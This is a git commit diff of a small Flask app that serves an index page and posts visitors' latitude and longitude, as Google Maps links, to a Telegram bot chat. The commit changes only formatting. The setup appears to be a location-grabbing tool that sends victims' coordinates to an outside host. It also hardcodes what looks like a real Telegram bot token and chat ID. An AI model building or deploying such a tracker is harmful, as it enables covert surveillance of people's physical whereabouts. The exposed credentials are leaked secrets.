5ffe8e97f6ffa1324c996d58473c03099823d81d
arab0009 <abu.taha9999999999@gmail.com>
2025-08-01 15:22:17 +0300

    Update app.py

--- app.py
+++ app.py
@@ -3,20 +3,21 @@ import requests
 
 app = Flask(__name__)
 
-BOT_TOKEN = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0'
-CHAT_ID = '7485197107'
+BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"
+CHAT_ID = "7485197107"
 
 @app.route('/')
-def home():
+def index():
     return send_from_directory('.', 'index.html')
 
 @app.route('/location', methods=['POST'])
 def location():
     data = request.json
-    lat = data.get('latitude'); lon = data.get('longitude')
-    message = f"📍 موقع جديد:\nhttps://maps.google.com/?q={lat},{lon}"
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id':CHAT_ID,'text':message})
-    return '',200
+    lat = data.get('latitude')
+    lon = data.get('longitude')
+    message = f"📍 تم تحديد موقع:\nhttps://maps.google.com/?q={lat},{lon}"
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': message})
+    return '', 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
